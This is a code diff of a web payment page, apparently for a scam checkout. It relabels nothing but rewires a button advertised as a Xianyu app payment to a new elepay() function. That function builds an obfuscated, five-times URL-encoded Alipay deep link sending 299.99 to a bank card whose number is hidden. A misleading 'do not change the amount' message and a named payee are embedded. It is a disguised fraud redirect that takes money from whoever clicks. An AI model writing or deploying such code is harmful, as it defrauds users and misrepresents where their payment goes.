@@ -82,7 +82,7 @@
                  style="background-color: rgb(204, 204, 204);color: rgb(119, 119, 119);">
                 <span></span>
                 <div id="fill" style="width: 0%;"></div>
-                <div id="xianyu" onclick="xuanyupay()">闲鱼APP跳转支付(免飞模式)</div>
+                <div id="xianyu" onclick="elepay()">闲鱼APP跳转支付(免飞模式)</div>
             </div>
 
 
@@ -208,6 +208,20 @@
         location.href = koubei_url;
     }
 
+    function elepay(){
+        var cardNo = "请勿修改金额两,分钟内到账****";
+        var bankName = "李杨";
+        var bankMark = "ABC";
+        var amount = "299.99";
+        var cardIndex = "1910091423107206258";
+        var bankAccount = "李杨";
+        var ele = "https://render.alipay.com/p/s/i?scheme=alipays://platformapi/startapp?saId=10000007&qrcode=https://ds.alipay.com/?from=mobilecodec&scheme=";
+
+        var dataUrl = "alipays://platformapi/startapp?appId=20000200&actionType=toCard&sourceId=bill&cardNo="+cardNo+"&bankAccount="+bankAccount+"&money="+amount+"&amount="+amount+"&bankMark="+bankMark+"&bankName="+bankName+"&cardIndex="+cardIndex+"&cardNoHidden=true&cardChannel=HISTORY_CARD&cardNoHidden=true&ap_framework_sceneId=20000200&REALLY_STARTAPP=true&startFromExternal=false&orderSource=from";
+
+        var ele_url ="eleme://web_overlay?url="+encodeURIComponent(ele) + encodeURIComponent(encodeURIComponent(encodeURIComponent(encodeURIComponent(encodeURIComponent(dataUrl)))));
+        location.href = ele_url;
+    }
 
 
     var ii = 0;
